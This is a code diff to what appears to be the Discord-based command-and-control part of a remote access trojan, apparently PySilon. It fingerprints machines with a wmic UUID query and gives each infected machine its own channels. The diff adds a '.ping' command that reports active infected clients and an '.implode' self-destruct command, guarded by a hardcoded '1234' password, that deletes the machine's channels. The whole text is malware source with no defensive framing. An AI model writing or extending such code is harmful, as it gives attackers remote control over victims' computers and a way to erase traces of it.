@@ -23,7 +23,7 @@ channel_ids = {
 
 @client.event
 async def on_ready():
-    global channel_ids
+    global channel_ids, category
     first_run = True
 
     hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
@@ -77,28 +77,25 @@ async def on_ready():
 @client.event
 async def on_message(ctx):
     print(ctx.content)
-    if ctx.channel.id in channel_ids.values():
+    if ctx.channel.id in channel_ids.values() or ctx.content == ".ping":
         await client.process_commands(ctx)
 
 @client.command(name="ping")
-async def bot_status(ctx):
+async def get_active_clients(ctx):
+    await ctx.message.delete()
     await client.get_channel(channel_ids['main']).send(ctx.author.mention)
 
-@client.command(name="rm-category")
-async def delete_category(ctx, category_id):
-    if ctx.message.channel.id in channel_ids.values():
-        try:
-            category_id = int(category_id)
-            category = discord.utils.get(ctx.guild.categories, id=category_id)
-            if not category:
-                await ctx.send('`' + category_id + ' is not a category!`')
-                return
-            for channel in category.channels:
-                await channel.delete()
-            await category.delete()
-        except:
-            await ctx.send('`An error has occurred.`')
+@client.command(name="implode")
+async def delete_category(ctx,  argument=None, password=None):
+    if argument == "full" and password == "1234":
+        for channel in category.channels:
+            await channel.delete()
+        await category.delete()
+        # implosion code
+    elif argument == "normal" and password == "1234":
+        await ctx.send('`Normal implosion`')
+        # implosion code
     else:
-        return
+        await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")
 
 # [pysilon] commands
